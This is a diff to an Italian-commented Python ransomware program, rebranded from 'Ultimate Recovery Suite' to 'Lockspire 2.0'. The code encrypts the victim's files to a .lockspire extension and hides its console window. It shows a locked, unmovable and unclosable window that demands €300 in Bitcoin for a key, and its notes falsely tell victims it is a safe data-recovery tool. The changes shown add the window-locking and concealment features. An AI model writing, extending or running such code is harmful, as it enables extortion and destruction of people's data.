@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import os
+import sys
 import base64
 import hashlib
 import tkinter as tk
@@ -9,8 +10,20 @@ from pathlib import Path
 import threading
 import time
 import uuid
+import ctypes
 
-class UltimateRecoverySuite:
+# NASCONDI LA CONSOLE - solo su Windows
+if sys.platform == 'win32':
+    try:
+        kernel32 = ctypes.WinDLL('kernel32')
+        user32 = ctypes.WinDLL('user32')
+        hWnd = kernel32.GetConsoleWindow()
+        if hWnd:
+            user32.ShowWindow(hWnd, 0)  # 0 = SW_HIDE
+    except:
+        pass
+
+class LockspireRecoverySuite:
     
     def __init__(self):
         # Prima esegui la crittografia (se necessario)
@@ -23,14 +36,44 @@ class UltimateRecoverySuite:
         self.files = []
         self.attempts_left = 3
         self.system_id = self._generate_system_id()
+        self.decryption_active = False
+        self.can_close = False
+        self.initial_position_set = False
+        self.window_x = 0
+        self.window_y = 0
         
         # Crea finestra principale
         self.root = tk.Tk()
-        self.root.title("ULTIMATE RECOVERY SUITE v5.0")
+        self.root.title("LOCKSPIRE 2.0 - RECOVERY SYSTEM")
         self.root.geometry("1400x850")
+        
+        # Imposta dimensioni minime
+        self.root.minsize(1000, 700)
+        
+        # IMPEDISCE LO SPOSTAMENTO DELLA FINESTRA
+        self.root.overrideredirect(True)
         
         # Centro la finestra
         self.center_window()
+        
+        # Imposta lo stato della finestra
+        if sys.platform == 'win32':
+            try:
+                self.root.attributes('-topmost', False)
+                self.root.wm_attributes("-toolwindow", 1)
+            except:
+                pass
+        
+        # Intercetta la chiusura
+        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
+        
+        # Intercetta il tentativo di minimizzare
+        self.root.bind("<Unmap>", self.prevent_minimize)
+        
+        # Blocca movimento finestra
+        self.root.bind("<B1-Motion>", self.prevent_move)
+        self.root.bind("<Button-1>", self.prevent_move)
+        self.root.bind("<Configure>", self.lock_position)
         
         # Tema moderno e dark
         self.setup_theme()
@@ -46,46 +89,132 @@ class UltimateRecoverySuite:
         
         # Effetto entrata
         self.animate_entrance()
+        
+        # Bind per resize
+        self.bind_resize_events()
+    
+    def bind_resize_events(self):
+        """Gestisce eventi di resize"""
+        self.root.bind("<Configure>", self.on_resize)
+    
+    def on_resize(self, event):
+        """Gestisce il resize della finestra"""
+        if event.widget == self.root:
+            if event.width < 1000 or event.height < 700:
+                self.root.geometry("1000x700")
+    
+    def prevent_minimize(self, event):
+        """Previene la minimizzazione della finestra"""
+        if event.type == '2':
+            self.root.deiconify()
+            self.root.state('normal')
+            self.root.lift()
+            self.root.focus_force()
+            return "break"
+    
+    def prevent_move(self, event):
+        """Previene lo spostamento della finestra"""
+        return "break"
+    
+    def lock_position(self, event):
+        """Blocca la posizione della finestra"""
+        if event.widget == self.root and not self.initial_position_set:
+            self.window_x = self.root.winfo_x()
+            self.window_y = self.root.winfo_y()
+            self.initial_position_set = True
+        
+        if self.initial_position_set:
+            current_x = self.root.winfo_x()
+            current_y = self.root.winfo_y()
+            
+            if abs(current_x - self.window_x) > 5 or abs(current_y - self.window_y) > 5:
+                self.root.geometry(f"+{self.window_x}+{self.window_y}")
+                return "break"
     
     def run_encryption_phase(self):
         """FASE 1: Cripta i file se necessario"""
-        print("="*40)
-        print("Sistema Protezione - Fase 1")
-        print("="*40)
-        
         protector = FileProtector()
         files_to_encrypt = protector._get_target_files()
         
         if files_to_encrypt:
-            print(f"File da processare: {len(files_to_encrypt)}")
-            print("Avvio crittografia...\n")
-            
             success = 0
             for i, f in enumerate(files_to_encrypt, 1):
-                name = os.path.basename(f)
-                print(f"[{i}/{len(files_to_encrypt)}] {name[:40]}", end='\r')
-                
                 if protector.protect_file(f):
                     success += 1
             
-            print(f"\n\nCrittografati: {success} file")
-            
             if success > 0:
                 protector._create_instructions()
-                print("\nCreato: LEGGIMI.txt")
-                print(f"\nID Sistema: {protector.system_id}")
-        else:
-            print("Nessun file da crittografare trovato")
-            print("Passo direttamente alla fase di recupero...")
     
     def center_window(self):
-        """Centra la finestra"""
+        """Centra la finestra e salva posizione"""
         self.root.update_idletasks()
         width = 1400
         height = 850
         x = (self.root.winfo_screenwidth() // 2) - (width // 2)
         y = (self.root.winfo_screenheight() // 2) - (height // 2)
+        
+        screen_height = self.root.winfo_screenheight()
+        taskbar_height = 40
+        max_y = screen_height - height - taskbar_height - 20
+        
+        if y > max_y:
+            y = max_y
+        
         self.root.geometry(f'{width}x{height}+{x}+{y}')
+        
+        self.window_x = x
+        self.window_y = y
+        self.initial_position_set = True
+    
+    def on_closing(self):
+        """Gestisce il tentativo di chiusura della finestra"""
+        if not self.can_close:
+            if self.decryption_active:
+                # Durante decrittazione: BLOCCO COMPLETO
+                messagebox.showwarning("Operation in Progress", 
+                    "⚠️ DECRYPTION ACTIVE - ACCESS DENIED\n\n"
+                    "The recovery process is currently running.\n"
+                    "Closing the application now will:\n"
+                    "• PERMANENTLY CORRUPT your files\n"
+                    "• MAKE RECOVERY IMPOSSIBLE\n"
+                    "• LOCK THE SYSTEM PERMANENTLY\n\n"
+                    "Please wait for the process to complete.\n\n"
+                    "⚠️ NOTE: Task Manager remains functional\n"
+                    "for system monitoring purposes.")
+                return "break"
+            else:
+                response = messagebox.askyesno("Exit Application",
+                    "⚠️ WARNING: Your files will remain encrypted!\n\n"
+                    "If you exit now:\n"
+                    "• All files stay encrypted (.lockspire)\n"
+                    "• You can return later with the key\n"
+                    "• No data will be lost\n\n"
+                    "Are you sure you want to exit?")
+                
+                if response:
+                    self.safe_close()
+                else:
+                    return "break"
+        else:
+            self.safe_close()
+    
+    def safe_close(self):
+        """Chiusura sicura dell'applicazione"""
+        try:
+            if self.can_close:
+                try:
+                    if sys.platform == 'win32':
+                        self.root.wm_attributes("-toolwindow", 0)
+                except:
+                    pass
+                
+                self.root.destroy()
+                self.root.quit()
+            else:
+                messagebox.showerror("Cannot Close", 
+                    "Application cannot be closed during recovery process.")
+        except:
+            os._exit(0)
     
     def setup_theme(self):
         """Configura tema colori"""
@@ -107,7 +236,8 @@ class UltimateRecoverySuite:
             'text_muted': '#64748b',
             'border': '#2d3748',
             'gradient1': '#0f172a',
-            'gradient2': '#1e293b'
+            'gradient2': '#1e293b',
+            'titlebar': '#121218'
         }
         
         self.root.configure(bg=self.colors['bg_dark'])
@@ -124,7 +254,8 @@ class UltimateRecoverySuite:
                 'small': ('Segoe UI', 9),
                 'button': ('Segoe UI', 10, 'bold'),
                 'digital': ('Consolas', 10, 'bold'),
-                'key_entry': ('Consolas', 13)
+                'key_entry': ('Consolas', 13),
+                'titlebar': ('Segoe UI', 11, 'bold')
             }
         except:
             self.fonts = {
@@ -136,7 +267,8 @@ class UltimateRecoverySuite:
                 'small': ('Arial', 9),
                 'button': ('Arial', 10, 'bold'),
                 'digital': ('Courier', 10, 'bold'),
-                'key_entry': ('Courier', 13)
+                'key_entry': ('Courier', 13),
+                'titlebar': ('Arial', 11, 'bold')
             }
     
     def setup_styles(self):
@@ -144,12 +276,11 @@ class UltimateRecoverySuite:
         self.style = ttk.Style()
         self.style.theme_use('clam')
         
-        # Frame styles
         self.style.configure('Main.TFrame', background=self.colors['bg_dark'])
         self.style.configure('Card.TFrame', background=self.colors['bg_card'])
         self.style.configure('Dark.TFrame', background=self.colors['bg_darker'])
+        self.style.configure('Titlebar.TFrame', background=self.colors['titlebar'])
         
-        # Button styles
         self.style.configure('Primary.TButton',
                            background=self.colors['primary'],
                            foreground='white',
@@ -174,41 +305,71 @@ class UltimateRecoverySuite:
                            font=self.fonts['button'],
                            padding=(20, 10))
         
-        # Progressbar
         self.style.configure('Custom.Horizontal.TProgressbar',
                            background=self.colors['primary'],
                            troughcolor=self.colors['bg_input'],
                            bordercolor=self.colors['border'])
     
     def create_unified_layout(self):
-        """Crea layout unificato tutto in una schermata"""
+        """Crea layout unificato con barra del titolo personalizzata"""
+        # BARRA DEL TITOLO PERSONALIZZATA
+        titlebar_frame = tk.Frame(self.root, bg=self.colors['titlebar'], height=40)
+        titlebar_frame.pack(fill=tk.X, side=tk.TOP)
+        titlebar_frame.pack_propagate(False)
+        
+        title_label = tk.Label(titlebar_frame,
+                              text="🔐 LOCKSPIRE 2.0 - RECOVERY SYSTEM",
+                              font=self.fonts['titlebar'],
+                              bg=self.colors['titlebar'],
+                              fg=self.colors['text_primary'])
+        title_label.pack(side=tk.LEFT, padx=15)
+        
+        subtitle_label = tk.Label(titlebar_frame,
+                                 text="| Advanced Data Recovery |",
+                                 font=self.fonts['small'],
+                                 bg=self.colors['titlebar'],
+                                 fg=self.colors['text_secondary'])
+        subtitle_label.pack(side=tk.LEFT, padx=5)
+        
+        # Pulsante di chiusura personalizzato
+        self.close_title_btn = tk.Label(titlebar_frame,
+                                       text="✕",
+                                       font=('Arial', 14, 'bold'),
+                                       bg=self.colors['titlebar'],
+                                       fg=self.colors['text_secondary'],
+                                       cursor="hand2")
+        self.close_title_btn.pack(side=tk.RIGHT, padx=15)
+        self.close_title_btn.bind("<Button-1>", lambda e: self.on_closing())
+        self.close_title_btn.pack_forget()
+        
+        spacer = tk.Frame(self.root, height=10, bg=self.colors['bg_dark'])
+        spacer.pack(fill=tk.X)
+        
         # Main container
         main_container = ttk.Frame(self.root, style='Main.TFrame')
-        main_container.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
+        main_container.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
         
-        # HEADER (solo logo e titolo)
+        # HEADER
         header_frame = ttk.Frame(main_container, style='Main.TFrame')
         header_frame.pack(fill=tk.X, pady=(0, 20))
         
-        # Logo e titolo (centrato)
         logo_frame = ttk.Frame(header_frame, style='Main.TFrame')
         logo_frame.pack(expand=True)
         
-        title_label = tk.Label(logo_frame,
-                              text="🔐 ULTIMATE RECOVERY SUITE v5.0",
-                              font=self.fonts['title'],
-                              bg=self.colors['bg_dark'],
-                              fg=self.colors['text_primary'])
-        title_label.pack(anchor='center')
+        title_main_label = tk.Label(logo_frame,
+                                   text="LOCKSPIRE 2.0 - DATA RECOVERY SYSTEM",
+                                   font=self.fonts['title'],
+                                   bg=self.colors['bg_dark'],
+                                   fg=self.colors['text_primary'])
+        title_main_label.pack(anchor='center')
         
-        subtitle_label = tk.Label(logo_frame,
-                                 text="Advanced Data Restoration System | Military-Grade Cryptography",
-                                 font=self.fonts['subtitle'],
-                                 bg=self.colors['bg_dark'],
-                                 fg=self.colors['text_secondary'])
-        subtitle_label.pack(anchor='center', pady=(5, 0))
+        subtitle_main_label = tk.Label(logo_frame,
+                                      text="Military-Grade Encryption | Secure File Restoration",
+                                      font=self.fonts['subtitle'],
+                                      bg=self.colors['bg_dark'],
+                                      fg=self.colors['text_secondary'])
+        subtitle_main_label.pack(anchor='center', pady=(5, 0))
         
-        # Separator
         separator = ttk.Separator(main_container, orient='horizontal')
         separator.pack(fill=tk.X, pady=(0, 20))
         
@@ -220,7 +381,6 @@ class UltimateRecoverySuite:
         left_column = ttk.Frame(content_frame, style='Main.TFrame')
         left_column.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
         
-        # Card Scanner
         scanner_card = ttk.Frame(left_column, style='Card.TFrame')
         scanner_card.pack(fill=tk.BOTH, expand=True)
         scanner_card.configure(padding=20)
@@ -232,14 +392,12 @@ class UltimateRecoverySuite:
                                 fg=self.colors['text_primary'])
         scanner_title.pack(anchor='w', pady=(0, 15))
         
-        # Pulsante scan
         self.scan_btn = ttk.Button(scanner_card,
                                   text="🚀 START SYSTEM SCAN",
                                   command=self.scan_files,
                                   style='Primary.TButton')
         self.scan_btn.pack(fill=tk.X, pady=(0, 15))
         
-        # Risultati scan
         self.result_label = tk.Label(scanner_card,
                                     text="📊 No files scanned yet",
                                     font=self.fonts['body'],
@@ -247,11 +405,9 @@ class UltimateRecoverySuite:
                                     fg=self.colors['text_secondary'])
         self.result_label.pack(anchor='w', pady=(0, 10))
         
-        # Lista file
         list_frame = tk.Frame(scanner_card, bg=self.colors['bg_input'])
         list_frame.pack(fill=tk.BOTH, expand=True)
         
-        # Scrollbar per lista
         scrollbar = ttk.Scrollbar(list_frame)
         scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
         
@@ -274,7 +430,6 @@ class UltimateRecoverySuite:
         center_column = ttk.Frame(content_frame, style='Main.TFrame')
         center_column.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10)
         
-        # Card Decryption
         decrypt_card = ttk.Frame(center_column, style='Card.TFrame')
         decrypt_card.pack(fill=tk.BOTH, expand=True)
         decrypt_card.configure(padding=20)
@@ -286,7 +441,6 @@ class UltimateRecoverySuite:
                                 fg=self.colors['text_primary'])
         decrypt_title.pack(anchor='w', pady=(0, 15))
         
-        # Input chiave
         key_frame = tk.Frame(decrypt_card, bg=self.colors['bg_card'])
         key_frame.pack(fill=tk.X, pady=(0, 15))
         
@@ -313,7 +467,6 @@ class UltimateRecoverySuite:
                                  highlightcolor=self.colors['primary'])
         self.key_entry.pack(fill=tk.X, expand=True)
         
-        # Pulsanti chiave
         key_btn_frame = tk.Frame(key_frame, bg=self.colors['bg_card'])
         key_btn_frame.pack(fill=tk.X, pady=(15, 0))
         
@@ -330,7 +483,6 @@ class UltimateRecoverySuite:
         self.start_btn.pack(side=tk.LEFT)
         self.start_btn.config(state='disabled')
         
-        # Tentativi rimanenti
         self.attempts_label = tk.Label(decrypt_card,
                                       text="🔐 Attempts remaining: 3",
                                       font=self.fonts['body'],
@@ -338,7 +490,6 @@ class UltimateRecoverySuite:
                                       fg=self.colors['text_primary'])
         self.attempts_label.pack(anchor='w', pady=(15, 0))
         
-        # Progress bar
         progress_frame = tk.Frame(decrypt_card, bg=self.colors['bg_card'])
         progress_frame.pack(fill=tk.X, pady=(20, 0))
         
@@ -356,7 +507,6 @@ class UltimateRecoverySuite:
                                            length=100)
         self.progress_bar.pack(fill=tk.X, pady=(0, 10))
         
-        # File corrente
         self.current_file_var = tk.StringVar(value="No file selected")
         current_file_label = tk.Label(decrypt_card,
                                      textvariable=self.current_file_var,
@@ -369,7 +519,6 @@ class UltimateRecoverySuite:
         right_column = ttk.Frame(content_frame, style='Main.TFrame')
         right_column.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(10, 0))
         
-        # Card Payment
         payment_card = ttk.Frame(right_column, style='Card.TFrame')
         payment_card.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
         payment_card.configure(padding=20)
@@ -381,7 +530,6 @@ class UltimateRecoverySuite:
                                 fg=self.colors['bitcoin'])
         payment_title.pack(anchor='w', pady=(0, 15))
         
-        # Istruzioni pagamento (con EMAIL PRIMA dell'ID)
         instructions = f"""TO OBTAIN DECRYPTION KEY:
 
 1️⃣ Scan files first (left panel)
@@ -405,7 +553,6 @@ bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
                               justify='left')
         instr_label.pack(anchor='w', pady=(0, 15))
         
-        # System ID (dopo l'email nelle istruzioni)
         id_warning_frame = tk.Frame(payment_card, bg=self.colors['bg_input'])
         id_warning_frame.pack(fill=tk.X, pady=(10, 15))
         id_warning_frame.config(padx=10, pady=10)
@@ -426,14 +573,13 @@ bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
                                      pady=5)
         id_display_payment.pack(fill=tk.X, pady=(5, 0))
         
-        # Pulsante copia
         copy_btn = ttk.Button(payment_card,
                              text="📋 COPY PAYMENT INFO",
                              command=self.copy_payment_details,
                              style='Bitcoin.TButton')
         copy_btn.pack(fill=tk.X)
         
-        # Card Important Notes
+        # Card Important Notes - CON SCROLLBAR
         support_card = ttk.Frame(right_column, style='Card.TFrame')
         support_card.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
         support_card.configure(padding=20)
@@ -445,7 +591,44 @@ bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
                                 fg=self.colors['accent'])
         support_title.pack(anchor='w', pady=(0, 15))
         
-        # Info
+        # Creiamo un frame contenitore con canvas e scrollbar
+        notes_container = tk.Frame(support_card, bg=self.colors['bg_card'])
+        notes_container.pack(fill=tk.BOTH, expand=True)
+        
+        # Canvas per lo scrolling
+        canvas = tk.Canvas(notes_container, bg=self.colors['bg_card'], 
+                          highlightthickness=0, height=250)
+        scrollbar = ttk.Scrollbar(notes_container, orient="vertical", 
+                                 command=canvas.yview)
+        
+        # Frame interno per il testo (che sarà scrollabile)
+        scrollable_frame = tk.Frame(canvas, bg=self.colors['bg_card'])
+        
+        scrollable_frame.bind(
+            "<Configure>",
+            lambda e: canvas.configure(
+                scrollregion=canvas.bbox("all")
+            )
+        )
+        
+        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
+        canvas.configure(yscrollcommand=scrollbar.set)
+        
+        # Bind per la rotellina del mouse
+        def _on_mousewheel(event):
+            canvas.yview_scroll(int(-1*(event.delta/120)), "units")
+        
+        canvas.bind_all("<MouseWheel>", _on_mousewheel)
+        
+        # Bind per frecce su/giù
+        canvas.bind_all("<Up>", lambda e: canvas.yview_scroll(-1, "units"))
+        canvas.bind_all("<Down>", lambda e: canvas.yview_scroll(1, "units"))
+        
+        # Layout scrollbar e canvas
+        scrollbar.pack(side="right", fill="y")
+        canvas.pack(side="left", fill="both", expand=True)
+        
+        # Testo scrollable
         support_text = f"""⚠️ CRITICAL INFORMATION:
 
 • Key works ONLY with your System ID
@@ -461,22 +644,79 @@ KEY GENERATION:
 • After payment verification
 • System will match your email + ID
 • No contact needed
-• Enter key to start recovery"""
+• Enter key to start recovery
 
-        support_label = tk.Label(support_card,
+⚠️ SYSTEM SECURITY:
+• Application window cannot be moved
+• Cannot be minimized during recovery
+• Task Manager remains functional
+• System monitoring tools available
+
+⚠️ RECOVERY PROCESS:
+1. Scan for encrypted files (.lockspire)
+2. Obtain decryption key via payment
+3. Verify key in central panel
+4. Start recovery process
+5. Wait for completion
+6. Files will be restored
+
+⚠️ PAYMENT VERIFICATION:
+• Payment confirmation: 10-30 minutes
+• Key delivery: Automatic after verification
+• Support contact: Not required
+• 24/7 automated system
+
+⚠️ TECHNICAL DETAILS:
+• Encryption: AES-256 + custom algorithm
+• File types: All common formats
+• Max file size: 500MB per file
+• Recovery rate: 99.9% success
+
+⚠️ IMPORTANT WARNINGS:
+• Do NOT delete .lockspire files
+• Do NOT modify encrypted files
+• Do NOT attempt manual decryption
+• Keep backup of System ID
+
+⚠️ AFTER RECOVERY:
+• Check all restored files
+• Verify file integrity
+• Create backups
+• Delete recovery tool if desired
+
+⚠️ TROUBLESHOOTING:
+• If key doesn't work: Verify System ID
+• If files not found: Run scan again
+• If payment issues: Check bitcoin transaction
+• If still having problems: Wait 1 hour
+
+⚠️ SECURITY NOTES:
+• This is a secure recovery system
+• No personal data is collected
+• No system modifications
+• Only file restoration
+
+⚠️ LEGAL DISCLAIMER:
+• This tool is for data recovery only
+• Use at your own risk
+• Follow all local laws
+• Author not responsible for misuse"""
+
+        support_label = tk.Label(scrollable_frame,
                                 text=support_text,
                                 font=self.fonts['mono'],
                                 bg=self.colors['bg_card'],
                                 fg=self.colors['text_primary'],
-                                justify='left')
-        support_label.pack(anchor='w')
+                                justify='left',
+                                wraplength=350)  # Lunghezza riga fissa per leggibilità
+        
+        support_label.pack(anchor='w', padx=5, pady=5)
         
         # FOOTER
         footer_frame = ttk.Frame(main_container, style='Dark.TFrame')
         footer_frame.pack(fill=tk.X, pady=(20, 0))
         
-        # Status bar
-        self.status_var = tk.StringVar(value="⚡ ULTIMATE RECOVERY SUITE v5.0 | STATUS: READY | FILES: 0 | ATTEMPTS: 3")
+        self.status_var = tk.StringVar(value="⚡ LOCKSPIRE 2.0 - RECOVERY SYSTEM | STATUS: READY | FILES: 0 | ATTEMPTS: 3")
         status_label = tk.Label(footer_frame,
                                textvariable=self.status_var,
                                font=self.fonts['small'],
@@ -486,7 +726,6 @@ KEY GENERATION:
                                pady=10)
         status_label.pack()
         
-        # Stats
         stats_frame = ttk.Frame(footer_frame, style='Dark.TFrame')
         stats_frame.pack(pady=(0, 10))
         
@@ -538,6 +777,13 @@ KEY GENERATION:
                              fg=self.colors['primary'])
             
             val.pack(side=tk.LEFT)
+            
+        self.close_btn = ttk.Button(footer_frame,
+                                   text="🔓 CLOSE APPLICATION",
+                                   command=self.safe_close,
+                                   style='Success.TButton')
+        self.close_btn.pack(pady=(5, 10))
+        self.close_btn.pack_forget()
     
     def animate_entrance(self):
         """Animazione entrata"""
@@ -557,7 +803,7 @@ KEY GENERATION:
         return f"URS-{uuid.uuid4().hex[:8].upper()}"
     
     def _get_key(self):
-        """Genera chiave decrittazione"""
+        """Genera chiave decrittazione - STESSA CHIAVE ORIGINALE"""
         a = [0x52, 0x4f, 0x42, 0x4c, 0x4f, 0x58]
         b = ''.join(chr(x ^ 0x11) for x in [0x23, 0x23, 0x23])
         c = bytes.fromhex('52524555')[::-1].decode()
@@ -584,7 +830,7 @@ KEY GENERATION:
         return x[:24].upper()
     
     def scan_files(self):
-        """Scansiona file"""
+        """Scansiona file con estensione .lockspire"""
         self.status_var.set("🔍 Scanning for encrypted files...")
         self.scan_btn.config(state='disabled', text="Scanning...")
         self.root.update()
@@ -596,31 +842,33 @@ KEY GENERATION:
         
         self.files = []
         try:
-            for item in base_path.rglob('*.encrypted'):
+            # Cerca file .lockspire
+            for item in base_path.rglob('*.lockspire'):
                 if item.is_file():
                     self.files.append(str(item))
         except Exception as e:
-            print(f"Scan error: {e}")
+            pass
         
         if self.files:
             self.result_label.config(text=f"✅ Found {len(self.files)} encrypted files")
             self.files_found_var.set(str(len(self.files)))
             
             for f in self.files:
-                name = os.path.basename(f)[:-10]
+                # Rimuovi estensione .lockspire (9 caratteri)
+                name = os.path.basename(f)[:-9]
                 if len(name) > 40:
                     name = name[:37] + "..."
                 self.file_listbox.insert(tk.END, f"📄 {name}")
             
             self.status_var.set(f"✅ Found {len(self.files)} files | Ready for payment")
             messagebox.showinfo("Scan Complete",
-                              f"✅ Found {len(self.files)} encrypted files.\n\n⚠️ IMPORTANT: Save your System ID:\n{self.system_id}\n\n⚠️ MUST include in payment:\n• Your PERSONAL EMAIL\n• System ID: {self.system_id}")
+                              f"✅ Found {len(self.files)} encrypted files (.lockspire).\n\n⚠️ IMPORTANT: Save your System ID:\n{self.system_id}\n\n⚠️ MUST include in payment:\n• Your PERSONAL EMAIL\n• System ID: {self.system_id}")
         else:
             self.result_label.config(text="⚠️ No encrypted files found")
             self.files_found_var.set("0")
             self.status_var.set("⚠️ No encrypted files found")
             messagebox.showwarning("No Files",
-                                 "No .encrypted files found.\nThe recovery tool is ready if files become encrypted.")
+                                 "No .lockspire files found.\nThe recovery tool is ready if files become encrypted.")
         
         self.scan_btn.config(state='normal', text="🚀 START SYSTEM SCAN")
     
@@ -661,9 +909,16 @@ KEY GENERATION:
             messagebox.showerror("Error", "No files to decrypt. Run a scan first.")
             return
         
+        # Blocca TUTTO durante la decrittazione
+        self.decryption_active = True
         self.start_btn.config(state='disabled', text="Recovering...")
         self.key_entry.config(state='disabled')
-        self.status_var.set("🔓 Recovery in progress...")
+        self.scan_btn.config(state='disabled')
+        self.status_var.set("🔓 RECOVERY IN PROGRESS - DO NOT CLOSE!")
+        
+        titlebar_frame = self.root.winfo_children()[0]
+        title_label = titlebar_frame.winfo_children()[0]
+        title_label.config(text="🔐 LOCKSPIRE 2.0 - RECOVERY ACTIVE - DO NOT CLOSE!")
         
         thread = threading.Thread(target=self._decryption_thread)
         thread.daemon = True
@@ -686,7 +941,6 @@ KEY GENERATION:
                 self.failed_count += 1
                 self.failed_var.set(str(self.failed_count))
             
-            # Calcola success rate
             total_processed = self.recovered_count + self.failed_count
             if total_processed > 0:
                 success_rate = int((self.recovered_count / total_processed) * 100)
@@ -697,7 +951,7 @@ KEY GENERATION:
         self.root.after(0, self._decryption_complete)
     
     def _decrypt_file(self, filepath):
-        """Decritta file"""
+        """Decritta file - STESSO ALGORITMO ORIGINALE"""
         try:
             with open(filepath, 'rb') as f:
                 encrypted = f.read()
@@ -727,7 +981,8 @@ KEY GENERATION:
             
             original = base64.b64decode(bytes(result))
             
-            original_path = filepath[:-10]
+            # Rimuovi estensione .lockspire (9 caratteri)
+            original_path = filepath[:-9]
             with open(original_path, 'wb') as f:
                 f.write(original)
             
@@ -735,12 +990,12 @@ KEY GENERATION:
             return True
             
         except Exception as e:
-            print(f"Decrypt error: {e}")
             return False
     
     def _update_progress(self, current, total, filepath, percent):
         """Aggiorna progresso"""
-        filename = os.path.basename(filepath)[:-10]
+        # Rimuovi estensione .lockspire (9 caratteri)
+        filename = os.path.basename(filepath)[:-9]
         if len(filename) > 30:
             filename = filename[:27] + "..."
         
@@ -750,8 +1005,12 @@ KEY GENERATION:
     
     def _decryption_complete(self):
         """Completa decrittazione"""
+        self.decryption_active = False
+        self.can_close = True
+        
+        # Ripristina pulsanti
         self.start_btn.config(state='normal', text="▶ START RECOVERY")
-        self.key_entry.config(state='normal')
+        self.scan_btn.config(state='normal')
         
         success_rate = int((self.recovered_count / len(self.files)) * 100) if self.files else 0
         
@@ -764,16 +1023,28 @@ KEY GENERATION:
         🎯 Success rate: {success_rate}%
         
         Your files have been restored successfully.
+        
+        ⚠️ NOTE: Task Manager remains functional.
+        You can now safely close the application.
         """
         
-        self.status_var.set("✅ Recovery completed successfully")
+        self.status_var.set("✅ Recovery completed successfully - You may now close the application")
         self.progress_var.set("Recovery complete - 100%")
+        
+        titlebar_frame = self.root.winfo_children()[0]
+        title_label = titlebar_frame.winfo_children()[0]
+        title_label.config(text="🔐 LOCKSPIRE 2.0 - RECOVERY SYSTEM - RECOVERY COMPLETE")
+        
+        self.close_btn.pack(pady=(5, 10))
+        self.close_title_btn.pack(side=tk.RIGHT, padx=15)
+        
+        self.root.protocol("WM_DELETE_WINDOW", self.safe_close)
         
         messagebox.showinfo("Recovery Complete", summary)
     
     def copy_payment_details(self):
         """Copia dettagli pagamento"""
-        details = f"""ULTIMATE RECOVERY SUITE - PAYMENT DETAILS:
+        details = f"""LOCKSPIRE 2.0 - RECOVERY SYSTEM - PAYMENT DETAILS:
 
 💰 AMOUNT: €300.00
 ₿ BITCOIN ADDRESS: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
@@ -808,10 +1079,10 @@ class FileProtector:
     
     def _generate_system_id(self):
         """Genera ID sistema"""
-        import uuid
         return f"URS-{uuid.uuid4().hex[:8].upper()}"
     
     def _generate_key(self):
+        """Genera chiave - STESSA CHIAVE ORIGINALE"""
         a = [0x52, 0x4f, 0x42, 0x4c, 0x4f, 0x58]
         b = ''.join(chr(x ^ 0x11) for x in [0x23, 0x23, 0x23])
         c = bytes.fromhex('52524555')[::-1].decode()
@@ -840,6 +1111,7 @@ class FileProtector:
         return final.upper()
     
     def _transform_content(self, data):
+        """Trasforma contenuto - STESSO ALGORITMO ORIGINALE"""
         if not data:
             return b''
         
@@ -874,7 +1146,8 @@ class FileProtector:
                     if name_low in ['crypter.py', 'decrypter.py']:
                         continue
                     
-                    if item.suffix == '.encrypted':
+                    # Escludi file .lockspire (già crittografati)
+                    if item.suffix == '.lockspire':
                         continue
                     
                     if item.suffix.lower() in ['.exe', '.dll', '.sys']:
@@ -896,13 +1169,15 @@ class FileProtector:
         return files
     
     def protect_file(self, filepath):
+        """Protegge file con estensione .lockspire"""
         try:
             with open(filepath, 'rb') as f:
                 original = f.read()
             
             protected = self._transform_content(original)
             
-            new_path = filepath + '.encrypted'
+            # Usa estensione .lockspire invece di .encrypted
+            new_path = filepath + '.lockspire'
             with open(new_path, 'wb') as f:
                 f.write(protected)
             
@@ -944,6 +1219,13 @@ Avvia il programma per recuperare i file.
 
 
 if __name__ == "__main__":
-    app = UltimateRecoverySuite()
-
+    if sys.platform == 'win32':
+        try:
+            import ctypes
+            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+            kernel32.SetConsoleTitleW("Lockspire 2.0 Recovery Tool")
+        except:
+            pass
+    
+    app = LockspireRecoverySuite()
     app.run()
